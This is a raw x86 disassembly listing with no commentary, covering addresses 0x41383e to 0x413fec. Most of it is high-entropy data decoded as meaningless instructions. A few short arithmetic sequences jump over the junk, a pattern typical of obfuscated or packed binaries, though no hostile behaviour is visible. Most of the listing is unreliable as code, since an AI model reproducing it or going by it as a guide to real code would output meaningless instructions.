  41383e:	retf   
  41383f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413840:	loopne 0x413870
  413842:	pop    ss
  413843:	rcl    BYTE PTR [eax],cl
  413845:	adc    al,ch
  413847:	ficomp DWORD PTR [esi+0x97f6289]
  41384d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41384e:	push   0x73
  413850:	sub    eax,0x8f05e75e
  413855:	push   esp
  413856:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  413858:	cmp    eax,0x2fd019bb
  41385d:	dec    esi
  41385e:	mov    eax,0x3a36cd6a
  413863:	lock mov ebp,0x32a0156e
  413869:	int3   
  41386a:	jns    0x413879
  41386c:	inc    ecx
  41386d:	adc    BYTE PTR [eax-0x44734d7e],bh
  413873:	mov    ebp,0xe0404560
  413878:	push   esp
  413879:	push   edx
  41387a:	mov    ds:0x5e283d25,eax
  41387f:	dec    edi
  413880:	gs dec esi
  413882:	(bad)  
  413883:	daa    
  413884:	sbb    al,0x37
  413886:	xchg   edx,eax
  413887:	jne    0x413821
  413889:	inc    esp
  41388a:	daa    
  41388b:	add    eax,ebx
  41388d:	xchg   ebx,eax
  41388e:	jnp    0x4138b5
  413890:	mov    ebx,0xa796df63
  413895:	(bad)  
  413896:	cdq    
  413897:	stos   BYTE PTR es:[edi],al
  413898:	lods   al,BYTE PTR ds:[esi]
  413899:	mov    ebx,DWORD PTR [ebp-0x1c]
  41389c:	xor    ecx,0x1b8b
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx-0x2a],ebp
  4138e5:	inc    bh
  4138e7:	jl     0x4138e0
  4138e9:	cmp    bl,BYTE PTR [eax]
  4138eb:	sbb    BYTE PTR [edx-0x38e7e7ee],ch
  4138f1:	enter  0xe0d4,0x8f
  4138f5:	pop    esp
  4138f6:	sbb    BYTE PTR [ebx-0x7d33f037],dl
  4138fc:	mov    ?,WORD PTR [edi+0x5accc749]
  413902:	mov    ds:0xfeeff9b6,eax
  413907:	mov    cl,0xe9
  413909:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41390a:	pop    ds
  41390b:	ret    0xb7a7
  41390e:	cmp    eax,0x2b1a0c3c
  413913:	fbld   TBYTE PTR [esi-0x337296db]
  413919:	je     0x4138eb
  41391b:	or     edx,DWORD PTR [edi]
  41391d:	in     al,0x6f
  41391f:	adc    ch,BYTE PTR [edx]
  413921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413922:	mov    dl,0x20
  413924:	push   ebx
  413925:	aam    0x47
  413927:	cld    
  413928:	fisttp WORD PTR [ecx]
  41392a:	call   0xcf2696db
  41392f:	(bad)  
  413930:	dec    edx
  413931:	sub    ebp,edi
  413933:	mov    ds:0xe56d656c,eax
  413938:	jo     0x413997
  41393a:	inc    edx
  41393b:	mov    eax,0x4158caab
  413940:	jg     0x413922
  413942:	jmp    0x41392c
  413944:	adc    al,0x2
  413946:	inc    ebp
  413947:	out    0x62,eax
  413949:	jbe    0x41395d
  41394b:	mov    edx,0x88996676
  413950:	mov    ch,BYTE PTR [ebp+eax*2+0x5d681d46]
  413957:	jg     0x41392f
  413959:	fistp  DWORD PTR [edi]
  41395b:	ficom  WORD PTR [ebx-0x76c36173]
  413961:	addr16 xchg esp,eax
  413963:	pop    edi
  413964:	jle    0x41395d
  413966:	or     DWORD PTR [ebx],0x67f0ffea
  41396c:	cmp    edi,DWORD PTR [ebx]
  41396e:	test   DWORD PTR [ebp+0x76ecb55f],ecx
  413974:	imul   ebp,DWORD PTR [ecx-0x28],0x7e
  413978:	or     bh,BYTE PTR [edi]
  41397a:	and    al,0xd7
  41397c:	inc    edi
  41397d:	in     al,dx
  41397e:	sahf   
  41397f:	(bad)  [edx+0x5a784ab8]
  413985:	pop    ss
  413986:	mov    esp,edx
  413988:	and    bh,BYTE PTR [eax-0x1bac82e5]
  41398e:	pop    edi
  41398f:	out    dx,eax
  413990:	cmovne ebp,DWORD PTR [edi-0x2]
  413994:	scas   al,BYTE PTR es:[edi]
  413995:	fbstp  TBYTE PTR [esi+esi*1+0xc]
  413999:	outs   dx,DWORD PTR ds:[esi]
  41399a:	jle    0x41395e
  41399c:	push   0xab2cec92
  4139a1:	cmp    al,0x8c
  4139a3:	(bad)  [edi+ecx*2+0x4e]
  4139a7:	or     esi,DWORD PTR [edi]
  4139a9:	sti    
  4139aa:	cmc    
  4139ab:	mov    cl,0x44
  4139ad:	xor    eax,0xfec7312a
  4139b2:	imul   edi,ecx,0xffffffc0
  4139b5:	mov    bh,0x59
  4139b7:	mov    ecx,esi
  4139b9:	sbb    BYTE PTR [esi],ah
  4139bb:	mov    bh,BYTE PTR [edx-0x25a3feed]
  4139c1:	test   bh,dh
  4139c3:	loop   0x41399e
  4139c5:	iret   
  4139c6:	and    bl,BYTE PTR [esi-0x59]
  4139c9:	jbe    0x4139df
  4139cb:	pop    edi
  4139cc:	paddq  mm4,QWORD PTR [ebx+0x65]
  4139d0:	dec    esi
  4139d1:	cli    
  4139d2:	arpl   WORD PTR [eax+0x59e4b364],di
  4139d8:	and    eax,DWORD PTR [eax+0x7c4d1d3a]
  4139de:	gs pop ebp
  4139e0:	and    edx,DWORD PTR [eax+edx*8]
  4139e3:	cdq    
  4139e4:	xlat   BYTE PTR ds:[ebx]
  4139e5:	rcr    BYTE PTR [edx+edi*4],1
  4139e8:	mov    WORD PTR [edx+0x7efcda3b],es
  4139ee:	fnstcw WORD PTR [ebx+0x6a]
  4139f1:	jecxz  0x413a39
  4139f3:	adc    BYTE PTR [esi+0x7d],0x25
  4139f7:	ja     0x413a12
  4139f9:	sbb    esi,DWORD PTR [ebp-0x2c]
  4139fc:	cmp    eax,DWORD PTR [edi+0x8]
  4139ff:	inc    esi
  413a00:	inc    ebp
  413a01:	xchg   esp,eax
  413a02:	xchg   ebx,eax
  413a03:	inc    ebp
  413a04:	call   0x2243:0x6d100b55
  413a0b:	mov    ecx,0x7d88a857
  413a10:	cmp    BYTE PTR [ecx-0x40],0x28
  413a14:	cld    
  413a15:	xchg   esi,eax
  413a16:	push   0x50055631
  413a1b:	sub    al,0x0
  413a1d:	push   0x36
  413a1f:	dec    esi
  413a20:	pop    ds
  413a21:	mov    eax,0xf6ef74a
  413a26:	in     al,dx
  413a27:	repz dec ebx
  413a29:	mov    eax,0x7054207d
  413a2e:	test   eax,0xd1224e08
  413a33:	push   ax
  413a35:	aaa    
  413a36:	aad    0xd
  413a38:	add    ebx,esp
  413a3a:	or     eax,0x80098ab0
  413a3f:	in     eax,dx
  413a40:	jbe    0x413a91
  413a42:	mov    cl,0x2a
  413a44:	pop    ss
  413a45:	lds    esi,FWORD PTR [ebx]
  413a47:	lea    ebx,[edx]
  413a49:	jnp    0x413a46
  413a4b:	jle    0x413ab0
  413a4d:	xor    DWORD PTR [ecx],edi
  413a4f:	or     edx,DWORD PTR [ebx+eiz*8]
  413a52:	pop    ecx
  413a53:	outs   dx,DWORD PTR ds:[esi]
  413a54:	jg     0x413a21
  413a56:	repz popf 
  413a58:	into   
  413a59:	cmp    eax,0x1befa9f4
  413a5e:	push   ds
  413a5f:	sub    BYTE PTR [ecx+0x46fc5058],bh
  413a65:	das    
  413a66:	imul   bh
  413a68:	jo     0x413a08
  413a6a:	popa   
  413a6b:	int    0x5f
  413a6d:	es mov ebx,ebp
  413a70:	(bad)  
  413a71:	cli    
  413a72:	cmp    esi,ecx
  413a74:	sbb    eax,ecx
  413a76:	or     eax,0x1b653fb9
  413a7b:	mov    esi,ebx
  413a7d:	(bad)  
  413a7e:	jle    0x413af4
  413a80:	and    BYTE PTR [ebx],dl
  413a82:	inc    esi
  413a83:	mov    dl,ah
  413a85:	ret    0xa4d
  413a88:	push   esp
  413a89:	pusha  
  413a8a:	xlat   BYTE PTR ds:[ebx]
  413a8b:	xchg   esp,eax
  413a8c:	gs xchg edx,eax
  413a8e:	and    BYTE PTR [edi+ecx*4],cl
  413a91:	push   0x7
  413a93:	pop    edi
  413a94:	aam    0x7e
  413a96:	add    bl,BYTE PTR [edi+0x1b]
  413a99:	cmp    BYTE PTR [edi-0x26],bh
  413a9c:	adc    DWORD PTR [edx],0xc4243d4f
  413aa2:	std    
  413aa3:	inc    esi
  413aa4:	pop    ebx
  413aa5:	jns    0x413aa9
  413aa7:	mov    esi,0x1f1d759a
  413aac:	sub    cl,BYTE PTR [eax+0x4e66c35c]
  413ab2:	push   es
  413ab3:	fisttp DWORD PTR [esi+0x4ec60f90]
  413ab9:	loope  0x413a3f
  413abb:	xor    edx,DWORD PTR [esp+0x30]
  413abf:	add    BYTE PTR [eax-0x40],al
  413ac2:	mov    BYTE PTR [eax-0x1],al
  413ac5:	jecxz  0x413ae9
  413ac7:	xchg   BYTE PTR [ebp-0x20d577e1],ch
  413acd:	or     ebp,DWORD PTR [edi]
  413acf:	add    ebx,DWORD PTR [ebp-0x4c]
  413ad2:	es int3 
  413ad4:	test   DWORD PTR [edx],0x54c3dd88
  413ada:	mov    dh,0xb7
  413adc:	test   al,0xa5
  413ade:	mov    bl,0x37
  413ae0:	repnz cmp eax,0x4ecbd490
  413ae6:	sbb    DWORD PTR [esi-0x7d],ecx
  413ae9:	jb     0x413b40
  413aeb:	jl     0x413b1e
  413aed:	aas    
  413aee:	jbe    0x413b03
  413af0:	adc    eax,0x26936cce
  413af5:	test   ch,al
  413af7:	cmp    dh,BYTE PTR [ebx]
  413af9:	sahf   
  413afa:	inc    ecx
  413afb:	ror    DWORD PTR [ecx],0x17
  413afe:	es rcl edi,1
  413b01:	lea    eax,cs:[esi+eiz*8+0x11548aff]
  413b09:	outs   dx,DWORD PTR ds:[esi]
  413b0a:	xor    dh,cl
  413b0c:	scas   al,BYTE PTR es:[edi]
  413b0d:	hlt    
  413b0e:	cmp    BYTE PTR [eax],dl
  413b10:	mov    ch,0xa3
  413b12:	mov    al,0xd3
  413b14:	sbb    al,0xba
  413b16:	imul   BYTE PTR [edi+0x61]
  413b19:	cmp    dl,BYTE PTR [esi-0x7c8dd80d]
  413b1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b20:	pop    ds
  413b21:	aam    0x60
  413b23:	jae    0x413b6e
  413b25:	je     0x413b52
  413b27:	add    DWORD PTR [esi+0x20315ef6],esi
  413b2d:	jge    0x413ae7
  413b2f:	imul   ecx,DWORD PTR [ebx],0xdeaa9e93
  413b35:	sar    DWORD PTR [edx+0x48014fb8],1
  413b3b:	or     esp,edx
  413b3d:	and    eax,0xad0ce205
  413b42:	push   esi
  413b43:	out    0xb0,eax
  413b45:	test   DWORD PTR [eax+0x29],esi
  413b48:	ficom  DWORD PTR ds:0x154357d2
  413b4e:	ins    DWORD PTR es:[edi],dx
  413b4f:	ret    0x2018
  413b52:	dec    edi
  413b53:	mov    eax,0xe3a3122e
  413b58:	in     eax,dx
  413b59:	xchg   ecx,eax
  413b5a:	cwde   
  413b5b:	js     0x413b94
  413b5d:	cmc    
  413b5e:	std    
  413b5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b61:	xchg   esp,eax
  413b62:	(bad)  
  413b63:	sti    
  413b64:	inc    ebp
  413b65:	dec    ecx
  413b66:	push   esp
  413b67:	xchg   esp,eax
  413b68:	pop    edx
  413b69:	jb     0x413b22
  413b6b:	pop    ss
  413b6c:	lods   eax,DWORD PTR ds:[esi]
  413b6d:	adc    DWORD PTR [ebp-0x51096f33],esp
  413b73:	mov    DWORD PTR [eax+0x6e0c310d],edi
  413b79:	jo     0x413be6
  413b7b:	test   DWORD PTR [edi-0x145c8620],esi
  413b81:	dec    ecx
  413b82:	idiv   bh
  413b84:	push   0xf
  413b86:	xor    esp,edx
  413b88:	jmp    0x8056101
  413b8d:	push   esi
  413b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b8f:	dec    ebx
  413b90:	xor    al,0xd2
  413b92:	mov    esp,0xdc3ce1ef
  413b97:	pop    ecx
  413b98:	mov    ecx,0x57aef20a
  413b9d:	fcomp  QWORD PTR [ebx]
  413b9f:	xchg   ebp,eax
  413ba0:	scas   al,BYTE PTR es:[edi]
  413ba1:	dec    ebx
  413ba2:	pusha  
  413ba3:	loop   0x413c1f
  413ba5:	into   
  413ba6:	mov    al,ds:0x8d6ef855
  413bab:	adc    edx,DWORD PTR [edx-0x38]
  413bae:	enter  0x7a81,0xa9
  413bb2:	fwait
  413bb3:	xchg   esi,eax
  413bb4:	adc    al,0x76
  413bb6:	jp     0x413bc4
  413bb8:	enter  0xf6f4,0x64
  413bbc:	jo     0x413c2e
  413bbe:	adc    DWORD PTR [ebp+0x5c],esp
  413bc1:	jns    0x413b4a
  413bc3:	rcr    BYTE PTR [esi-0x51],0xb2
  413bc7:	adc    ah,BYTE PTR [ebx]
  413bc9:	sub    edi,ecx
  413bcb:	adc    eax,0x1573519a
  413bd0:	mov    ah,0xe4
  413bd2:	imul   edx,edx,0xcdaee90a
  413bd8:	(bad)  
  413bd9:	scas   eax,DWORD PTR es:[edi]
  413bda:	inc    edi
  413bdb:	test   dh,al
  413bdd:	sahf   
  413bde:	std    
  413bdf:	es ret 
  413be1:	std    
  413be2:	out    dx,eax
  413be3:	call   0x10b32711
  413be8:	sbb    dl,al
  413bea:	lods   eax,DWORD PTR ds:[esi]
  413beb:	sbb    BYTE PTR [ebx+0x68cb7a10],dh
  413bf1:	std    
  413bf2:	add    eax,0x663f7ea1
  413bf7:	js     0x413c41
  413bf9:	dec    edi
  413bfa:	repnz int 0x4
  413bfd:	fwait
  413bfe:	xor    edi,edx
  413c00:	adc    al,0x2b
  413c02:	dec    ebp
  413c03:	(bad)  
  413c05:	ror    DWORD PTR [eax],cl
  413c07:	pop    esp
  413c08:	push   edi
  413c09:	adc    dh,dl
  413c0b:	sar    DWORD PTR [ebx+0x2b],0x1d
  413c0f:	ja     0x413c5b
  413c11:	and    eax,0xfec6f414
  413c16:	pushfw 
  413c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c19:	push   esp
  413c1a:	cmp    al,0x4d
  413c1c:	jmp    0xb4c3:0x8b3fe2c8
  413c23:	mov    ds:0xe6db8403,eax
  413c28:	outs   dx,BYTE PTR ds:[esi]
  413c29:	mov    ebx,0x249f5d4a
  413c2e:	push   ecx
  413c2f:	and    esi,esp
  413c31:	xor    bh,bh
  413c33:	and    bh,0xcc
  413c36:	lods   al,BYTE PTR ds:[esi]
  413c37:	xor    edi,DWORD PTR [edx+0x6c]
  413c3a:	mov    ds:0x33d9dc59,al
  413c3f:	into   
  413c40:	push   0x5c
  413c42:	cmp    al,0xce
  413c44:	enter  0x449b,0x6d
  413c48:	jnp    0x413c8e
  413c4a:	ret    0x1a21
  413c4d:	adc    DWORD PTR [eax+0x1d],ebp
  413c50:	push   ds
  413c51:	mul    DWORD PTR ds:0xe0722422
  413c57:	idiv   BYTE PTR [edx+esi*1]
  413c5a:	imul   DWORD PTR [ebp+ebx*1-0x20]
  413c5e:	mov    al,ds:0x8e8de52a
  413c63:	addr16 (bad) 
  413c65:	sbb    edi,DWORD PTR [edx]
  413c67:	jno    0x413c63
  413c69:	jmp    0x413bf7
  413c6b:	dec    edi
  413c6c:	jne    0x413c7a
  413c6e:	dec    ebp
  413c6f:	ins    BYTE PTR es:[edi],dx
  413c70:	test   BYTE PTR [ebp-0x4ec7ba28],bh
  413c76:	stos   BYTE PTR es:[edi],al
  413c77:	push   es
  413c78:	inc    ebp
  413c79:	out    dx,eax
  413c7a:	aad    0xfa
  413c7c:	(bad)  
  413c7d:	jnp    0x413ca4
  413c7f:	outs   dx,BYTE PTR ds:[esi]
  413c80:	add    edx,DWORD PTR [edi-0x3dec984b]
  413c86:	daa    
  413c87:	shl    DWORD PTR [ebx-0x2130f8bb],1
  413c8d:	in     eax,0xe1
  413c8f:	test   edx,esp
  413c91:	stc    
  413c92:	mov    bh,0xa6
  413c94:	sbb    ah,al
  413c96:	fistp  WORD PTR ds:0x597e527b
  413c9c:	xlat   BYTE PTR ds:[ebx]
  413c9d:	nop
  413c9e:	lock out 0x1,eax
  413ca1:	retf   
  413ca2:	adc    BYTE PTR [esi+0x18],0x44
  413ca6:	stos   BYTE PTR es:[edi],al
  413ca7:	mov    ecx,0x35b0629
  413cac:	adc    BYTE PTR [ebx+0x5813d84d],cl
  413cb2:	add    al,0x6a
  413cb4:	add    dh,BYTE PTR [ebx]
  413cb6:	fimul  WORD PTR [ebx+0x2b5edc75]
  413cbc:	icebp  
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	xchg   edx,eax
  413cff:	xor    ebp,DWORD PTR [ebp+0x183289b0]
  413d05:	sbb    BYTE PTR [edx-0x27e7e7ee],ch
  413d0b:	ja     0x413d67
  413d0d:	xor    edx,ecx
  413d0f:	iret   
  413d10:	repz pushf 
  413d12:	pop    es
  413d13:	test   BYTE PTR [eax],0xfa
  413d16:	add    eax,0xc888dec5
  413d1b:	mov    ebp,0x2626c297
  413d20:	fisub  WORD PTR [ebx+0x2f]
  413d23:	add    eax,0x655958ac
  413d28:	adc    dl,BYTE PTR [ebp-0x51]
  413d2b:	jo     0x413cc5
  413d2d:	push   esp
  413d2e:	cdq    
  413d2f:	ds test eax,0x5d8ca4a9
  413d35:	adc    BYTE PTR [esi+0x1a],al
  413d38:	imul   edi,DWORD PTR [edx-0x3d],0x2b1928f1
  413d3f:	lds    ecx,FWORD PTR [eax]
  413d41:	push   edi
  413d42:	xor    eax,DWORD PTR [ebx]
  413d44:	aam    0x2c
  413d46:	sub    eax,0x6de96e0e
  413d4b:	and    DWORD PTR [eax+0x73],ecx
  413d4e:	add    BYTE PTR [esp+edi*8],ch
  413d51:	sbb    DWORD PTR [esi+0x62bfa216],ecx
  413d57:	iret   
  413d58:	pop    ecx
  413d59:	pop    ds
  413d5a:	arpl   WORD PTR [edx-0x18f57b22],si
  413d60:	push   0x9acb968f
  413d65:	adc    DWORD PTR [eax+ebp*8-0x45c4d809],ebp
  413d6c:	cmp    esp,DWORD PTR [edi+0x5e4a1511]
  413d72:	pop    esi
  413d73:	adc    dh,dl
  413d75:	fidivr WORD PTR [ecx+0x2d]
  413d78:	cli    
  413d79:	aam    0x3f
  413d7b:	or     BYTE PTR ds:0x8404ef10,dh
  413d81:	jne    0x413d83
  413d83:	sbb    esi,DWORD PTR [ebx]
  413d85:	pop    ebp
  413d86:	test   al,0xad
  413d88:	dec    esi
  413d89:	add    eax,0xac25dc64
  413d8e:	repnz pushf 
  413d90:	xor    edx,DWORD PTR [ebx+0x74c9ef15]
  413d96:	or     edx,ecx
  413d98:	aaa    
  413d99:	cs ret 0xcbe5
  413d9d:	pop    esi
  413d9e:	xchg   ecx,eax
  413d9f:	xchg   esi,eax
  413da0:	icebp  
  413da1:	sar    BYTE PTR [eax-0x5e],0x57
  413da5:	cli    
  413da6:	xchg   ebp,eax
  413da7:	hlt    
  413da8:	sub    al,0x14
  413daa:	cmp    BYTE PTR [eax],0xd3
  413dad:	mov    ebp,0xc979771f
  413db2:	mov    al,0x60
  413db4:	xor    esp,DWORD PTR [ebx]
  413db6:	pop    edi
  413db7:	or     al,0x97
  413db9:	inc    ecx
  413dba:	sub    BYTE PTR [esi],ah
  413dbc:	aam    0x75
  413dbe:	sbb    eax,0xa39be5ca
  413dc3:	adc    eax,0x6153a173
  413dc8:	scas   al,BYTE PTR es:[edi]
  413dc9:	aad    0x20
  413dcb:	imul   edx,ebx,0x66
  413dce:	pusha  
  413dcf:	xor    BYTE PTR [ebx],0xd1
  413dd2:	push   esp
  413dd3:	lahf   
  413dd4:	mov    dh,0x81
  413dd6:	lock rol DWORD PTR [esi+0x69],0x7d
  413ddb:	dec    edx
  413ddc:	sbb    al,0x95
  413dde:	add    dl,bl
  413de0:	mov    bh,0xfb
  413de2:	stos   DWORD PTR es:[edi],eax
  413de3:	push   cs
  413de4:	xchg   ebp,eax
  413de5:	cmovg  ebx,edx
  413de8:	jb     0x413d95
  413dea:	rcl    DWORD PTR [edx-0x6d],cl
  413ded:	test   eax,0x1f9d0b75
  413df2:	sub    DWORD PTR [ecx-0x41bd047d],esp
  413df8:	mov    al,ds:0xbc5e9157
  413dfd:	test   BYTE PTR [edi-0x6504e0af],ch
  413e03:	add    esp,edx
  413e05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e06:	cli    
  413e07:	pushf  
  413e08:	stos   DWORD PTR es:[edi],eax
  413e09:	popf   
  413e0a:	mov    al,ds:0xc1d00f28
  413e0f:	sub    BYTE PTR [ecx-0x3a2f9523],bl
  413e15:	and    esi,0xffffffc1
  413e18:	rcr    BYTE PTR [edi-0x442a60c1],1
  413e1e:	inc    eax
  413e1f:	ins    DWORD PTR es:[edi],dx
  413e20:	adc    al,0x12
  413e22:	dec    ebp
  413e23:	mov    edx,DWORD PTR [ebx-0x5c64da59]
  413e29:	(bad)  
  413e2a:	pcmpgtb mm6,QWORD PTR [ecx-0x26654b65]
  413e31:	push   esp
  413e32:	inc    ebx
  413e33:	add    edx,edx
  413e35:	push   eax
  413e36:	inc    edx
  413e37:	fs jl  0x413e03
  413e3a:	aaa    
  413e3b:	dec    ebx
  413e3c:	mov    ecx,0x3ca7bed9
  413e41:	sbb    DWORD PTR [ebx+0x3b],edi
  413e44:	cli    
  413e45:	xor    BYTE PTR [eax],cl
  413e47:	retf   
  413e48:	mov    ?,edx
  413e4a:	loope  0x413e32
  413e4c:	mov    dl,0x54
  413e4e:	(bad)  
  413e4f:	inc    esp
  413e50:	pop    ebp
  413e51:	add    al,0x66
  413e53:	les    ebx,FWORD PTR [eax+ecx*4]
  413e56:	xlat   BYTE PTR ds:[ebx]
  413e57:	jne    0x413ed8
  413e59:	mov    bl,0x3
  413e5b:	xor    ch,BYTE PTR [ebx-0x29]
  413e5e:	pop    ebp
  413e5f:	push   es
  413e60:	add    eax,0xdec6ec61
  413e65:	jmp    0x79176768
  413e6a:	leave  
  413e6b:	fadd   st(2),st
  413e6d:	dec    ebx
  413e6e:	pushf  
  413e6f:	ins    DWORD PTR es:[edi],dx
  413e70:	push   ss
  413e71:	pop    edx
  413e72:	push   0x725a50e8
  413e77:	sub    al,0xd4
  413e79:	jnp    0x413ebe
  413e7b:	sub    al,0xe5
  413e7d:	add    ecx,eax
  413e7f:	daa    
  413e80:	(bad)  
  413e82:	push   ecx
  413e83:	lock xchg esp,eax
  413e85:	cmp    ch,BYTE PTR [eax+0x4e75cab]
  413e8b:	(bad)  
  413e8c:	sub    dh,bh
  413e8e:	mov    ds:0xe4ac28db,eax
  413e93:	rol    BYTE PTR [ebp-0x7f],1
  413e96:	jl     0x413ec7
  413e98:	(bad)  
  413e99:	(bad)  
  413e9a:	sub    DWORD PTR [eax+ebx*8],eax
  413e9d:	pop    esp
  413e9e:	sbb    al,0xfb
  413ea0:	icebp  
  413ea1:	dec    esi
  413ea2:	clc    
  413ea3:	pop    ds
  413ea4:	pop    ebp
  413ea5:	js     0x413e6a
  413ea7:	in     al,0x1e
  413ea9:	shl    DWORD PTR [ebx-0x3c26206a],0x5f
  413eb0:	xchg   ebx,eax
  413eb1:	jb     0x413ec8
  413eb3:	iret   
  413eb4:	outs   dx,DWORD PTR ds:[esi]
  413eb5:	add    eax,0xb2752253
  413eba:	clc    
  413ebb:	xor    dh,BYTE PTR [edx-0x67157a21]
  413ec1:	cdq    
  413ec2:	mov    ds:0xda883e77,eax
  413ec7:	adc    BYTE PTR [eax],0xd2
  413eca:	(bad)  
  413ecb:	sbb    al,0x69
  413ecd:	and    DWORD PTR [esi-0x48],ebx
  413ed0:	adc    BYTE PTR [eax],bh
  413ed2:	sub    eax,0xb170a4c4
  413ed7:	and    edi,DWORD PTR ds:0x874358d
  413edd:	sbb    eax,0x618a5cf9
  413ee2:	adc    BYTE PTR [ebp-0x29],al
  413ee5:	lahf   
  413ee6:	cli    
  413ee7:	pop    edi
  413ee8:	stos   DWORD PTR es:[edi],eax
  413ee9:	jmp    0x413ee1
  413eeb:	fnstsw WORD PTR [edx+0x2d]
  413eee:	xor    BYTE PTR [edx+edx*4-0x2383ce9c],0x42
  413ef6:	inc    ecx
  413ef7:	mov    ?,WORD PTR [eax-0xa]
  413efa:	xor    BYTE PTR [ebx+0x70aae6a9],ch
  413f00:	sbb    BYTE PTR [ebx+eax*8],bh
  413f03:	(bad)  
  413f04:	dec    esi
  413f05:	adc    esi,esi
  413f07:	test   BYTE PTR [ebx-0x29],0xf7
  413f0b:	retf   0x1416
  413f0e:	cmp    al,0x2e
  413f10:	(bad)  
  413f11:	ret    0xc3f1
  413f14:	loop   0x413ed3
  413f16:	mov    eax,ds:0xa5253341
  413f1b:	and    BYTE PTR [ebx-0x3b35f19b],bh
  413f21:	leave  
  413f22:	cmp    ebx,DWORD PTR [esi-0x7]
  413f25:	pop    ecx
  413f26:	arpl   WORD PTR [edi],ax
  413f28:	mov    ecx,0xa4f8c0f8
  413f2d:	inc    ebp
  413f2e:	retf   0x4c80
  413f31:	dec    ecx
  413f32:	mov    al,ds:0xe3791b26
  413f37:	or     al,0xd2
  413f39:	imul   ecx,DWORD PTR [edi],0x1
  413f3c:	sahf   
  413f3d:	and    al,0x5e
  413f3f:	and    DWORD PTR [eax],0x9a396be2
  413f45:	or     ecx,DWORD PTR [ecx-0x3ad9ae3a]
  413f4b:	test   al,0x2f
  413f4d:	mov    ds,WORD PTR [edi]
  413f4f:	out    0x38,eax
  413f51:	shl    BYTE PTR [edi-0x394f00cb],0xc8
  413f58:	clc    
  413f59:	je     0x413f72
  413f5b:	dec    ebp
  413f5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f5d:	sbb    ebp,eax
  413f5f:	imul   edi,DWORD PTR [ecx+0x17b11b85],0x9e201637
  413f69:	ret    0x7cb3
  413f6c:	les    eax,FWORD PTR [esi+0x7a]
  413f6f:	cmp    BYTE PTR [ebx-0x3e72bfa5],dl
  413f75:	shl    al,cl
  413f77:	xchg   edx,eax
  413f78:	icebp  
  413f79:	or     bl,BYTE PTR [esi]
  413f7b:	(bad)  
  413f7c:	jmp    0x413fce
  413f7e:	leave  
  413f7f:	push   ecx
  413f80:	sub    edi,DWORD PTR [esi+0x5]
  413f83:	push   es
  413f84:	inc    eax
  413f85:	fcmovnb st,st(5)
  413f87:	cs sbb al,0x66
  413f8a:	or     esi,esi
  413f8c:	inc    eax
  413f8d:	inc    ebx
  413f8e:	sti    
  413f8f:	loope  0x413f8d
  413f91:	outs   dx,BYTE PTR ds:[esi]
  413f92:	aad    0x3c
  413f94:	add    eax,0xbafb8b8d
  413f99:	call   0x1cf422ca
  413f9e:	dec    eax
  413f9f:	mov    al,ds:0x68c09a83
  413fa4:	adc    al,0x30
  413fa6:	in     eax,dx
  413fa7:	test   ebp,eax
  413fa9:	xor    dl,BYTE PTR [ecx+eiz*1-0x4f]
  413fad:	mov    dh,0x4e
  413faf:	push   0xdddce4aa
  413fb4:	jb     0x413f9e
  413fb6:	test   eax,0xad199047
  413fbb:	in     eax,dx
  413fbc:	ins    BYTE PTR es:[edi],dx
  413fbd:	out    dx,al
  413fbe:	dec    ebx
  413fbf:	and    DWORD PTR [ebp-0x6b],edi
  413fc2:	shl    edi,0xa4
  413fc5:	int    0xe9
  413fc7:	mov    dl,0x3e
  413fc9:	stos   BYTE PTR es:[edi],al
  413fca:	int3   
  413fcb:	inc    ebx
  413fcc:	test   BYTE PTR [edx-0x61bf8d8b],bh
  413fd2:	jge    0x413f95
  413fd4:	popf   
  413fd5:	popa   
  413fd6:	jp     0x413fc9
  413fd8:	inc    esi
  413fd9:	pop    es
  413fda:	sbb    dl,BYTE PTR [edx]
  413fdc:	je     0x413fed
  413fde:	aam    0x4b
  413fe0:	adc    eax,0x4321a4b5
  413fe5:	ds clc 
  413fe7:	cld    
  413fe8:	daa    
  413fe9:	sbb    al,0xb9
  413feb:	stc    
  413fec:	pop    ds
